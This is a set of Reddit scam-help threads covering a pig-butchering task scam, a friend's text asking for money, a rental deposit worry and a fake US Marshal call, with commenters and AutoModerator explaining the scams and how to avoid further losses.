There are real collections agencies, and real shady collections agencies, and there are scam collections. Whether the real ones can call relatives depends on laws in your country or state.  If you get a call regarding a debt of yours, the best thing to do is tell them to send you a letter with the details of the original debt, and then hang up. Debt scammers, of course, won't send you a letter with the debt info.

But this debt, if it exists, isn't yours. By involving yourself with this, you are causing trouble for yourself, or wasting your time, or both.

Title: I've read through a few posts in this sub and I suspect I'm currently in a "pig butcher" scam. Please help
Body: An Asian girl approached me a week ago and flirted with me hard but at the same time, she always try to bring up this Armani customer service site that allows users to deposit money into and complete orders to gain profit. She showed me how it works and let me try it out using only 300$ and I profited 50$ from that investment in the same day. Now she's really pusing me to invest even more, up to 3000$, so that I can reap in even more profit from the larger investment. I'm in the middle of chatting with her right now on Whatsapp while trying to figure of whats the deal with this specific site. So far I have not found any info about this Armani website so I'm uncertain. However her behavior is smilar to the other scammers I've seen from the other posts and reports. I've put in almost 2000$ so far into this Armani site and they are making it hard for me to withdraw my balance unless I put in even more money. I'll stay alart for any replies so I can end this right now and cut my losses. Please help

- Sorry to say, you have already lost the $2,000. This is a !task scam, you will never be able to withdraw anything. NEVER. Block her.
- You will never get your money back, she is lying to you. Yes, you're correct, you are currently in a pig butchering scam. She does not really care about you, she just wants your money. I'm sorry, I know it hurts to find that someone is lying to you and scamming you.

Real women who are actually interested in meeting a guy will not start talking about money or investing before getting deep into an in-person relationship. 

You need to stop right now. Block her. Never talk to her again.  Accept the loss, but don't lose any more.
- You are correct, also looks like a !task scam as well...
- Your money is gone. It's gone. If you put more in trying to rescue it, that money will be gone too. Cut your losses. Delete the app, block the "girl", move on with your life. Also, look out for recovery scammers, anyone telling you they can get your money back is trying to scam you too.
- !whois jdwe.info

That website is three months old. These people have nothing to do with Armani. It‚Äôs all an illusion to fool the victims.
- Yup, your $2,000 is gone. It cannot be recovered. Please beware of people DMing you saying they ‚Äúknow a hacker on Telegram who can get your money back‚Äù.

These are !recovery scammers.
- Thanks for the replies everyone. I have blocked the scammer and stopped all money transfer. Should I report this scam to some authority?
- You are very lucky - you recognized that this is a scam before you lost all your money. There is no way to get your $2000 back, but you caught yourself quickly so you won't lose any more. 

Shut off all contact immediately, do not answer any more messages, do not talk to the "girl" (who is probably a guy), take control of the situation by ending this fast and completely. Well done!
- That website was created only 7 months ago, and only for 1 year. It is not the real Armani website. Real Armani is:  Armani.com

Info about the fake website will display below, calling the Whois bot

!whois armasshops.com
- You‚Äôre out 2K, cut your losses and get away asap.
- You're talking to a man. Hot girls don't show up out of nowhere trying to make you rich.
- As you've already guessed, the money is gone. Anyone who tells you otherwise is a !recovery scammer.
- At least it was only $2000. 
Block ‚Äúher‚Äù.
- "An Asian girl approached me a week ago and flirted with me hard but at the same time, she always try to bring up this Armani customer" ... yup it is a scam, and any money you have invested is gone without any hope of recovery. Pull out now and stop all contact with them, and be aware that you are now marked as an easy target and more scammers will try to contact you (even "recovery" scammers on Reddit claiming they can recover your lost money). Report it to the police (so they at least can get it into their statistics, even if the chances they can do anything for you are slim to none).
- You flirted with a girl to get investment advice?
- Greed will make you believe a complete stranger is happy to pass easy profits onto you and not take them for themselves.

The irony, they're the ones getting the easy profits, well their boss is anyways.
- All your money is gone.   They are making it difficult to withdraw, because there are no withdrawals.  You don't even have an account.  It's all fake to get you to give them more money.
- The money is gone, just block them and learn for the future. 

There will be people offering to "help" you get all or some money back but that's just a new scam, recovery scam. No one can get it back for you.
- Yeah this is a pig butchering which means a scam run out of Asia to fatten and slaughter you, like a big dumb pig.

Thankfully you figured out something is up. This is a variation as a !task scam. Either way the goal is to clean you out.

I‚Äôll put it this way. If you discovered a gravy train, easy way to make cash - would you message random people on the internet?

Or at most would you keep the secret, maybe tell a trusted family member to help them, or a good friend?why would you blow your easy income by telling every tom dick and harry about it?

Why would you give away that info for free?

Think about it. The answer is, a stranger messaging to ‚Äúhelp‚Äù you simply wants to help themselves to your money. No exceptions.

PS I have in the past discovered money making niches. I shared with a very small circle of loved ones and trusted associates. There is no circumstance where I would message and flirt with random dudes to hand out money. Ugh.

Don‚Äôt let your greed cloud your logic.
- Stupid link - armasshops.com - what sort of rubbish link is that? A home made website, for sure.
- It seems like you're in the middle of a "pig butchering" scam, and I‚Äôm sorry you‚Äôre dealing with this. These scammers are very good at manipulating people and making everything feel real, but once money‚Äôs sent, it's nearly impossible to get it back. 

The key now is to completely stop all contact with them‚Äîblock them and don‚Äôt send any more money.

I know it‚Äôs tough, but you‚Äôve caught it early, so the best move is to walk away and move on. Don‚Äôt fall for recovery scams either‚Äîthose are just another trick to get more money out of you.

If you want to do your part to help stop these scams, report it to **ic3.gov**. It might not get your money back, but it could help take down these scammers
- You guys make it too easy for them.

This sub is truly eye-opening.
- I‚Äôm in a very similar scam. But I‚Äôve lost over 3.5k gbp!! The scammers are begging me to put more money in as it‚Äôs the last Task and will get ALL my money back plus commission!!
- This woman and I are both Vietnamese and this Armani website has a customer service chat that also communicates using Vietnamese. The money I have transferred so far (using apps like Western Union, Remitly, Moneygram) are going to the same bank account in Vietnam
- I feel if we start holding the hosting and domain companies accountable for hosting these scams and phishing sites this shit would stop . GNAME is the worst offender because it‚Äôs almost impossible to get them to take down a site.  Their process sucks
- Absolutely a scam, and you won't be able to withdraw your balance, it's already gone.
- Plus. There's no Asian woman. There's no money. There's no investment. There's no flirting. All this is fake to take your money
- STOP NOW AND CUT YOUR LOSSES!! The money I‚Äôve already put in is gone, and you will never see it again. She will continue to touch you to deposit more money in order to get your money back, but each time something will happen, which will require you to deposit even more money to get back what you put in. This will continue until you finally figure out that you were being scammed and you stop. You will never see your money again. I fell for exactly the same kind of scam. And, do not respond to anyone saying that they can recover the money that you lost (or that they already have recovered it). These are the same scammers coming after you again.
- You met her in person? That's awfully risky for the average citizen. Must be a trafficked person.

- Hi /u/One_Resolution_8357, AutoModerator has been summoned to explain the Task scam.

Task scams involve a website or mobile app that claims you can earn money by completing easy tasks, such as watching a video, liking a post, or creating an order. A very common characteristic (but not entirely exclusive) is that you have to complete sets of 40 tasks. The app will tell you that you can earn money for each task, but the catch is that you can only do a limited number of tasks without upgrading your account. To upgrade your accounts, the scammers will require you to pay a fee. This makes it a variant of the advance fee scam.

The goal of this scam is to get people to download the app for easy money and then encourage them to pay to get to the next level. It's impossible to get your \"earnings\" out of the app, so victims will have wasted their time and money. This type of scam preys on the [sunk cost fallacy](https://en.wikipedia.org/wiki/Sunk_cost#Fallacy_effect), because people demonstrate a greater tendency to continue an endeavor once an investment has been made, and refusing to succumb to what may be described as cutting one's losses.

If you're involved in a task scam, cut your losses. Beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the money you already invested. They can't, it's a trick to make you lose more money. Thanks to redditor vignoniana for this script.

- Hi /u/erishun, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.

- Again,.... Please don't say this as people think that when they have a video call with the girl that or is not a scam. There are lots and lots of women // girls involved in it. 1 male and female humans do this because they are enlaves in Myanmar. 2 women are no saints and do scam.
- But there are hot girls who are also scammers.
- Hi /u/EggCzar, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.

- Hi /u/Mariss716, AutoModerator has been summoned to explain the Task scam.

Task scams involve a website or mobile app that claims you can earn money by completing easy tasks, such as watching a video, liking a post, or creating an order. A very common characteristic (but not entirely exclusive) is that you have to complete sets of 40 tasks. The app will tell you that you can earn money for each task, but the catch is that you can only do a limited number of tasks without upgrading your account. To upgrade your accounts, the scammers will require you to pay a fee. This makes it a variant of the advance fee scam.

The goal of this scam is to get people to download the app for easy money and then encourage them to pay to get to the next level. It's impossible to get your \"earnings\" out of the app, so victims will have wasted their time and money. This type of scam preys on the [sunk cost fallacy](https://en.wikipedia.org/wiki/Sunk_cost#Fallacy_effect), because people demonstrate a greater tendency to continue an endeavor once an investment has been made, and refusing to succumb to what may be described as cutting one's losses.

If you're involved in a task scam, cut your losses. Beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the money you already invested. They can't, it's a trick to make you lose more money. Thanks to redditor vignoniana for this script.

- They will never give you that money, I hope you understand this. Of course they're begging you, you gave them 3.5k but they want more.

Nobody really pays you for clicking a screen, no matter what they call it.

There is no commission. The platform is fake, the tasks are fake, the people are all lying to you. You will be required to pay a fee to continue working or to withdraw your money. Then another fee, and another. Then they disappear with your money.

Search this sub for task scams and other job scams. There are so many stories posted here, people have lost thousands, some people lose all of their savings in the hope of getting their money back, but you can't get it back.
- The website is fake. That's why you haven't been able to find anything about it. The money is going to a group of scammers. No real Armani, no orders, no customer service. Just you giving money to scammers.

She is working with a group of scammers, unfortunately.
- there is no "woman", "she" is probably a group of sweaty men in a basement somewhere slaving for an organized crime boss.

- Yeah, the irony is that scammers know someone who fell for a scam is too trusting, so it's worth their time trying to scam you in other ways, too. And also,  if you've just lost money you desperately want or need back, you're more vulnerable.

So in other words, by posting here, you've advertised yourself as an attractive target. That doesn't mean you made a mistake posting here - that was a smart move, cause now you know! It just means you'll need to ignore all your dms, even from those who don't immediately seem to fit the recovery scam profile. Even people that send you just a very friendly dm, stating that they've been through the same: ignore, ignore, ignore.
- Good bot
- They employ or entrap women. The scams are male-led gangs. It's never a real woman on the chat.
- Not an idiot. Maybe you're hopeful, maybe gullible. Scammers know how to prey on your emotions, they do this for a living, they're good at it. But now you're smarter, you've learned a lesson.
- Not truly an idiot. An idiot would've claimed that the investment was foolproof and their ego wouldn't have let them see what was happening.

You are far from an idiot. 

An idiot does not know they are the idiot.
- Yeh sadly I‚Äôm aware the money has gone. But the damn scammers still active and ‚Äúchatting‚Äù to me insisting they‚Äôre totally legit. Told em I‚Äôve reported to local law enforcement and they (the scammers) said that‚Äôs fine they‚Äôll cooperate with anybody. One of the scammers is insisting that if I complete Task 20 (another 880gbp) then I‚Äôd get a massive refund.
I‚Äôm just so disappointed with myself. The first 4 transactions I actually did get some money so that‚Äôs how I got lured in

- Hi /u/erkevin, AutoModerator has been summoned to explain the Romance scam.

Romance scammers pretend to be in love with their victims in order to ask them for money. They sometimes spend months grooming their victims, often pretending to be [members of military](https://www.cid.army.mil/romancescam.html), [oil workers or doctors](https://www.consumer.ftc.gov/articles/what-you-need-know-about-romance-scams). They tend to be extremely good at taking money from their victims again and again, leading many to [financial ruin](https://globalnews.ca/news/5095659/romance-scam-money/). Romance scam victims are emotionally invested in their relationship with the scammer, and will often ignore evidence they are being scammed.

If you know someone who is involved in a romance scam, beware that convincing a romance scam victim they are scammed is extremely difficult. We suggest that you sit down together to watch Dr. Phil's shows on romance scammers or episodes of Catfish - sometimes victims find it easier to accept information from TV shows than from their family. A good introduction to the topic is this video: https://youtu.be/PNWM5nuOExI -

Title: Can‚Äôt tell if a text from a friend requesting money is real or if she got hacked
Body: A friend I talk to every once in a while texted me asking to borrow $150. She said she lost her credit card, and the bank put a hold on her account until her new card arrives. She recently got engaged, and said her fiance has a ring payment that is due and they are financially strapped. The text seemed like her normal grammar, use of punctuation was normal, etc. and there was nothing fishy about the wording. 

Even though I‚Äôve known her for a while, it is really odd that she asked to borrow money from me since we aren‚Äôt super close. I sent her the $150 via Venmo thinking she really was in need, but then an hour later she texted again asking for another $50 and now I‚Äôm questioning if her iCloud got hacked or something. Why not just ask for the $200 upfront if that‚Äôs what was really needed??

I decided to call up a mutual friend to ask her opinion on whether this is real or not, and that friend said that she had also requested $150 from her as well! The friend requesting money told friend B that their internet bill doubled this month and since they just put a down payment on their wedding venue, she needed a little help.  

Anybody know of any iCloud hacking scams going around or do we think this is a legit need? If she got hacked, it‚Äôs weird that they know all the details of her personal life. I‚Äôm so confused 


**EDIT: wow, this is wild. Came on here to see if anyone else has seen this, as often times scams come in trends. Also to spread awareness so others can beware. What a rude bunch of people some of yall are‚Ä¶. 

Turns out it was my friend in need of money and she did not get hacked. She‚Äôs in a pit and I‚Äôm glad I was able to help her, whether I get my money back or not.

- Why not call her?
- You are just randomly sending money to people you aren't on that level with? 

If you really needed to borrow money from someone you knew, it would be awkward and you'd at least have the decency to call.

  
Come on. Just stop. Stop feeding these scam artists. I don't know why you wouldn't call that person directly and ask her what is up versus calling a friend to ask if she thinks it's legit. You got scammed.
- It's a scam but out of curiosity what method is "she" asking everyone to send her money through? also how did "she" contact you?

edit: I see now it says she texted. Since you're asking about iCloud I assume iMessage?
- JUST. CALL. HER!!!!
- Seriously it‚Äôs a scam. And if she is asking you for money and you are willing to lend/give it to her then pick up the phone and have a conversation with her. It only shows you care especially if you end up helping her. Nothing awkward about that. Guessing you are in the newer generation that does not believe in calling people. I understand us gen xers are not with the times but this is seriously the time to use the phone before you start sending cash or send more cash in your case. Can you imagine reaching out to someone that is not on that level and just randomly asking for cash and then having the nerve to ask for more right away?
- Always call them, always use information known only to the two of you.  If someone can't afford a ring payment they can't afford that ring - a plain metal band from a pawn shop will work just fine if you feel like you have to have a ring.  The 'two months salary' is a brand upsell started by DeBeers.
- Shout out to the OP for being too lazy to see whether the friend is really the one asking for money.  Shout out to the OP for being a person that will most likely be scammed pretty easily as an adult and showing up in the future as a senior citizen that has lost all life savings to scams.  

If you can't be bothered now as it's too awkward, life is going to do you no favors in the future I bet.
- Do you have a way to contact that friend that isn't a text? If that mode of conversation is compromised then they will just say they are the friend.

Can you call their parents or siblings or fiance?
- It's a common scam. Her account was most likely hacked.

I always worry it's really a friend in need so I test them. For example I reply with "Congratulations on your new house by the way, how do you like Idaho?" 

Of course I made all that up. Friend replies "What the hell are you talking about", or scammer replies "Oh yes the house is lovely and Idaho has grate potatoes".
- Ask a question that only they would know.
- why the heck are you talking about icloud?

Obviously a scam, nothing to do with icloud.
- If you can't tell CALL them and TALK to them
- This smells of scam. Contact your friend through a different method and ask them what‚Äôs going on.
- As opposed to spending half an hour composing a post on Reddit to describe the situation? That‚Äôs just crazy talk.
- I don‚Äôt talk on the phone with her regularly, so I‚Äôd feel awkward if it really was her needing the money and I was suspecting it to be a scam‚Ä¶. I see some other comments saying to call and ask to make sure the money went through and based on what she says I‚Äôll know if it‚Äôs her or not. I‚Äôll probably do that
- I sent the money directly to her Venmo. I‚Äôm curious how a scammer would even get the money, unless they hacked into both her iMessage and Venmo?
- The OP is just trying to sound knowledgeable but in reality there‚Äôs no such thing as iCloud hacking and it would have no effect on messaging. 

Why doesn‚Äôt he just call her? Sheesh.
- Yep, it was an iMessage text. Said she could take either cashapp or Venmo. I don‚Äôt have cashapp so I sent money via Venmo, because her Venmo is tied to her phone number which is why I didn‚Äôt question it so much at first. That‚Äôs what makes me think maybe her entire iCloud account got hacked, maybe the hacker changed the banking information tied to her Venmo?? I have no idea
- Apparently that would be "awkward" since they don't call each other...
- She is not close with her parents and is an only child. I don‚Äôt know her fiance very well. I thought about calling her directly, but would feel so awkward if it really was her asking for money? Idk I don‚Äôt talk with her on the phone regularly so I‚Äôm hesitant on how to frame this
- that‚Äôs what has been throwing me off the most though‚Ä¶she is texting just like her normal self and responding exactly as I would expect her to. So if this is indeed a hacker, they REALLY spent time reading her previous texts to make this look legit
- No, that's awkward. Better to just send the money, then spend 2 hours of Reddit arguing with people trying to help her.
- Idk how long it takes you to type but composing this post certainly did not take me half an hour‚Ä¶3 minutes tops and I‚Äôm not too concerned about that
- She certainly didn‚Äôt feel awkward hitting you up for free cash
- That's not awkward; it's prudent. She'd like to know if someone is using her name to scam people.
- "hey, just checking if this is really you, with all the scams going on"

Talk to her, FFS.
- Just call her ane check on her, if she's your friend and comfortable enough to ask for money, it shouldn't be weird at all. Instead of putting a post here, maybe check with mutual friends, family. There's ways you can figure this out without reddit.
- Call before you send money, she is begging for money, hard to feel awkward talking to her.

But for some not close person my answer to a text like that would be ... silence ...

It's a scam 99 times out of 100 and the other 1 out of 100 I wouldn't lend them money even if they were real

It is a BS sounding story from the start
- The scammer could be ... HER 

Scammed you out of $150, hitting you up for more, hitting up other friends

One of those IT DOESN"T MATTER situations.   Don't send people $150 because they barely know you and can't pay for an engagement ring.
- > there‚Äôs no such thing as iCloud hacking

A bunch of young female holiday celebs who have had their private photos leaked ... would disagree with you.
- ‚ÄúJust trying to sound knowledgeable‚Äù ‚Ä¶? Sheesh. I am literally here asking a question. ‚ÄúThere is no such thing as iCloud hacking‚Äù?? So if I somehow got your iCloud username and password I can‚Äôt log into your account on my MacBook? Of course I could.
- Could be that her phone got stolen and they have access to everything that was on there. I don't know a lot about iPhones, but I believe they have a feature to wipe them if they get stolen so I'm not sure why she wouldn't have done that if that was the case. What I do know is that even though I don't have an iPhone, I do have iMessage on my Macbook. That iMessage account is tied to my email address instead of my phone number. I don't know if there's a way to see if iMessages are being sent from a phone or a laptop but it might be worth looking into. It's possible for my fianc√©e to tell when I text her from my phone vs. my laptop on her iPhone but that could just be a symptom of my phone being an Android.

I do agree with the guy who replied to me and was a little overly aggressive about other things that calling her number and seeing who answers, if anyone, might not be a bad idea. I saw you said in another comment you'd feel weird calling her if it really is her asking for money; I would operate under the assumption that it isn't her. If it is her who answers, I would express concern for her and ask if she got the money/was able to pay off the ring. If she's like, "excuse me, what?" then you can tell her something is compromised and people are reaching out to her friends asking for money. If she knows what you're talking about you just seem like you care about her.

edit: any weird posts on her social media if you follow her?
- "Hey Samantha, just wanting to make sure its you, and your phone didnt get stolen or something. Theres so many scammers and thieves doing that nowadays. How are things going?"




PS never lend or give money to a friend that you arent ok with not getting back
- Then I would ignore the request. It is probably a stolen phone scam. Unless you can contact her a different way the scammer will play the part. They probably wouldn't answer the phone and insist on texting because of signal or some bs.
- That's why the fake-out works. She might respond normally to normal conversation, but if you text her "BTW I'm sorry to hear your father died, I can't believe he drove his bus into the lake!" you'll find out really quick 100% whether she's really her.
- lol
- The 15 follow-up responses took more than 3 minutes, though.
- She already sent the money. And now they want more. And she refuses to call...
- no, in fact, [you couldn‚Äôt](https://support.apple.com/en-us/102660)
- Apparently she asked our mutual friend for money a few days ago, so I don‚Äôt think the phone was stolen. If it was, I agree with you and would think she‚Äôd contact her service provider to cut off the service so that nobody could send anything or contact anyone with the phone, but I‚Äôm also not 100% sure how that works either. There hasn‚Äôt been any suspicious activity on her social media whatsoever
- So, an alternative to her phone being stolen is that her SIM got hijacked, meaning someone else took over her phone number through her service provider and is using it in another phone somewhere else. PSA for anyone reading: contact your cell phone service provider and ask them to lock porting out numbers so you have to provide a PIN to do it. Keep the PIN secret, if it's compromised it doesn't do you any good.

I was initially going to say the reason I don't think this is a case of SIM hijacking is that they have access to her Venmo and CashApp, but as I thought about it, I realized that I'm pretty sure both of those apps just ask for your phone number to log in and send you a code, so if someone did hijack her SIM it's possible that they got into those accounts as well.

edit: sorry, I always think of ONE MORE THING after I post. Is her Venmo history public? If yes, is it wildin' out right now?
- I didn‚Äôt think about her SIM getting hijacked, interesting thought. The weirdest thing to me is that her texts are so spot on with how she communicates, so if this is a hacker, they really spent time studying how she normally texts and mimicked it perfectly. 
Her social media and Venmo history were both the top two things I made sure to look into before anything. There is nothing suspicious about her Venmo history either‚Ä¶last transaction was from like a month ago, but of course who knows if payments were private between then and now.

Title: Am I being scammed by a rental broker?
Body: I‚Äôm trying to figure out if my husband and I got scammed by a leasing agent/broker. For the record he doesn‚Äôt think so, and I tend to be extremely anxious and blow things out of proportion. But here is what has happened so far. 

I found the listing on Redfin (it appeared on other sites listed with the same broker) and sent a request to view it. I got a text message the next day from the broker- in a bit broken English but that didn‚Äôt bother me and (it turns out she was Eastern European anyway). We went to tour it with her the same day. The space was gorgeous, fairly priced, she had all of the codes to the building and laundry and even said hi in a familiar way (by name) to the maintenance man at the building. She was up front that there was no parking, no AC, not sugarcoating. 

We finished the viewing and reached back out immediately for an application. She sent it to us a couple of hours later, we filled it out asap and sent it back. The following morning she reached out and said we got approved. A few hours later we got the rental agreement, info about the historical property (like non drilling disclosures) etc. All seemed normal. 

We sent everything signed and then she sent the payment options which were a cheque, or a wire transfer. This would be for first month and deposit. We chose wire transfer because we don‚Äôt have a cheque-book on hand. She also made it clear that future payments would be through a portal via the building management. 

This is all fine but of course (which I realize now is incredibly stupid) we sent the payment before receiving the agreement signed by the lessor, or an executed copy‚Ä¶

A couple of days ago she said they received the payment and that she‚Äôs working on getting the keys from management, and will have the executed copy tomorrow. That was yesterday, didn‚Äôt hear back. Around 5pm I said something like ‚Äúthanks looking forward to it‚Äù, and nothing. 

This morning I‚Äôm starting to panic a bit. I just sent a follow up checking in. It could be possible it‚Äôs just taking a while to receive on her end but‚Ä¶ idk I am freaked out. 

A few things: I managed to find info on the property and the owner online and it lined up with the wire transfer info. 

The broker is listed on all of the sites the listing was on. I looked up her license number and it does come up on the gov site but for some reason my laptop won‚Äôt open it so I can‚Äôt see if it expired. 

I realize the biggest mistake we made is to have sent money before receiving the executed copy‚Ä¶ but it‚Äôs too late now. I also have read that wire transfers are unusual to send for these things but my husband, his parents and my parents didn‚Äôt think it was. 

Anyway it‚Äôs possible she‚Äôs just taking forever to hear back from them but im losing my mind right now. So many things seem good - knowing the codes and the staff, the info of the owners lining up w the payment and the lease agreement‚Ä¶ she even asked us to sign up for the electricity bill which we did. I feel like those details are important but I would love some external input cos I feel crazy. Thanks in advance ü•≤

EDIT: good news. I just checked on the official website of the property and the phone number listed is the brokers number (that I‚Äôve texted with) I think that gives me some peace of mind that this is just unusual but likely not a scam. Will report back if it is lol

- It hasn't been long enough to be worried. You're anxious because you put yourself in a vulnerable position by paying by wire transfer in advance of getting the executed lease. Can you call the management company and confirm that she is one of their brokers?
- Most !rental scams I‚Äôve seen occur before a property has even been seen. The scammer needs a ‚Äúdeposit‚Äù before they are willing to show the property to the potential victim. In your case, you‚Äôve seen the property.

In scams where the property has been physically seen by the victim, it involves the scammer not showing up. They inform the victim that there‚Äôs a code to enter a lockbox and have the victim tour the unit without anyone there. In these cases, the unit was an AirBNB or a house for sale that the scammer got access to. They will then take the money and run. In your case, someone was there to show you the property and they even showed their face to witnesses.

It‚Äôs interesting that you don‚Äôt have a planned date for when you will get the keys/officially move in and do the initial inspections (you know, when you walk around and point out the condition of things so they can‚Äôt charge you for them later). That‚Äôs usually on the rental agreement when you sign it. If this is a scam, it‚Äôs not a typical one, but I can definitely see why you are worried. Definitely take previous commenter‚Äôs advice.
- That‚Äôs a great idea. Thank you I‚Äôm going to give that a whirl if I don‚Äôt get a response within a few hours.
- Thank you so much, I agree there are so many bits that make me feel like it isn‚Äôt a scam but more just an unusual situation. Definitely going to give the management a ring to confirm, I really hope I don‚Äôt get her in trouble if she is just in fact doing her job but I guess you can never be too careful.
- Hi /u/ditzen, AutoModerator has been summoned to explain the Rental scam.

Rental scammers usually list apartments at lower than market rate, and will ask for some money up front, or will offer you the keys for money up front. The scammer has no property to rent, and any money you send to the scammer will be lost.

Always tour the place in person with the landlord, property manager or realtor. Never alone, never with an access code, never virtually. Only send deposits and application fees after touring the place, and get a proper receipt for it. Anyone trying to collect money from you without meeting you is a scammer or a shit landlord.

Verify the identity of whoever is touring the place for you. It's always good to check with neighbors to see if the person you're dealing with is legit, or if there's a story behind it. You may learn that this is actually an Airbnb and that a scammer got an access code for it. You may find out the real owner/renter is away on vacation. And if it's a sublet, be informed about it and check with the original landlord to see if it's allowed.

Never sign contracts, or pay deposits, or even application fees/reservation fees without meeting in person first. Never ever send a photo ID or anything not considered public information. Nobody should ask you to pay to reserve your spot without meeting face to face.

Title: US Marshall Detective Scam Call
Body: Hey everyone, I posted my story on r/sanfrancisco and someone suggested I share it here, so I thought I would! 

I live in SF and today I got two calls from a SF number and they left voicemails both time. They were vague but non-urgent just requesting a call back due to an important matter. I don't believe it was a cloaked number because I was able to call back and leave a voicemail. They had my full name, number (clearly) and address. 

He called me back within 15 minutes or so, and I was already primed thinking it may be a scam. That said, the call started so legitimately that I immediately lowered my guard and felt like I'd actually done something wrong! 

The story went like this: He was a US Marshall Detective, he gave me his badge number and radio number, he said the call would be recorded to make sure my rights were ensured, etc. I had failed to appear in court today, did I know? I'd received a summons in December and signed for it, remember? 

Well, no, I hadn't received a summons and hadn't signed anything, but I do have a slightly chaotic roommate situation so again there was room for doubt in my mind that maybe something actually had gone astray. I don't know the legal system!

Anyway, here are my takeaways from the call: 

* Federal agencies tend to do most of their work through mail, not via the phone
* Scammers will be aggressive and get angry when you don't do what they want
   * I genuinely did not understand the steps I was being asked to follow and he grew increasingly angry with me and raised his voice to hostile levels, asking if I wanted to be arrested or if I thought this was a joke when I was just asking for an explanation
      * Truly, he started the call very empathetic and kind, like he was worried about me and didn't want me to have to pay these fines! 
   * Once I finally hung up, he kept calling back and left a voicemail that if I did not call back "within 10 minutes" I would be marked as "non compliant"
      * He also noted that he was adding my middle name to the file... like okay, you aren't scaring me at this point, but I could see how that would freak someone out 
* Be wary of anything that seems like it is happening urgently or immediately
   * This needed to happen "today or tomorrow" or my risk of "getting arrested" was extremely high
   * He was sending emails "to the judge" that were getting responses for next steps immediately. 
* Look for flaws in the story
   * The dude became a Lieutenant mid-conversation despite never sharing that title before and was able to waive my fees from "20k" to "2k" to "1k" when I told him I didn't have that kind of money
   * I was being GPS tracked all of a sudden?? He was like "I can see where you are" for when I went to withdraw cash... so come arrest me for my failure to appear in court?? What??? 
* Hang up and call a legitimate service
   * I called both the SF US Marshal's office and the police station where he told me he was currently working where I would have to meet him later to get my "reimbursement"
   * The SF Marshal's office basically said not to worry about it and to call the police
   * The police did not take a report but did ask if I sent him money and seemed very relieved when I didn't

I was primed for this being a scam call from the start so was looking for red flags the whole time, but I definitely wasted more time on this today than I wish I had! Even knowing about how scam calls work and how people get aggressive and serious right from the start, I still nearly fell for it!

Thanks for reading, and the second anyone asks you to walk to a CVS just hang up the phone! (He actually asked me to go to a Walmart first... of which there are none in San Francisco. So...)

- We got this exact scam posted here and I have a comment on tips to avoid the scam and other similar scams in the future: [https://www.reddit.com/r/Scams/comments/1i199z1/comment/m75cnl7/](https://www.reddit.com/r/Scams/comments/1i199z1/comment/m75cnl7/) (the OP is deleted but it was this scam)

Also, his instructions will be to go to the store and buy gift cards and send him the codes. That‚Äôs it. That‚Äôs the whole scam. Sometimes you get sent to a Bitcoin ATM and send money to them more directly.
- >a US Marshall Detective

There's no such thing.
- >He also noted that he was adding my middle name to the file... like okay, you aren't scaring me at this point, but I could see how that would freak someone out

That‚Äôs a funny detail. If they had your information and they were a Marshal, they would presumably have your full name in the ‚Äúfile‚Äù already.
- Yeah, that‚Äôs a super common one.
- The one time I got scammed, it was a version of this. I was very late paying the electric bill, with a termination notice. By chance as I was about to pay the bill I got a scam call claiming to be from the power company. Instead of going to my account online and paying the bill, I did a gift card.

In retrospect, of course the whole thing was obvious and incredibly stupid, but I was in a rush and frantic about other things in my life. I couldn't risk losing Internet access for work.

Scammers succeed when the target is rushed or anxious - hence the use of fake legal threats, lost pet scams, and blackmail threats when people send dick pix to strangers. I did report the scam to the police because the scammer was still in touch and I'm pretty sure was local. Law enforcement could not have cared less.

I consider the $200 I lost as the fee for a valuable lesson. And I'm very grateful to this sub for an ongoing education in what to look out for.
- Grateful that you were spared in this one.

So whenever you are in legal trouble, it's best to hang up/shut up and not negotiate unless you plan on bribing a LEO.

If you were to pay a fine, make sure that you have documentation and court papers in your hand that specifically state what happens when the fine is satisfied.  You also want to pay anything you don't walk away with using traceable/recoverable funds and pay only through a known payment portal and make sure you get a proper receipt.   This scam breaks all of those rules, most likely tossing cash or bitcoin in an ATM or something and the detective or whatever negotiating the fine down by 95% which is not in their job description.
- I got a call a bit ago from an "office" that received a complaint about me. Was told to call back. Looked up the number online and it is marked as scam. These calls are becoming more frequent and aggressive.
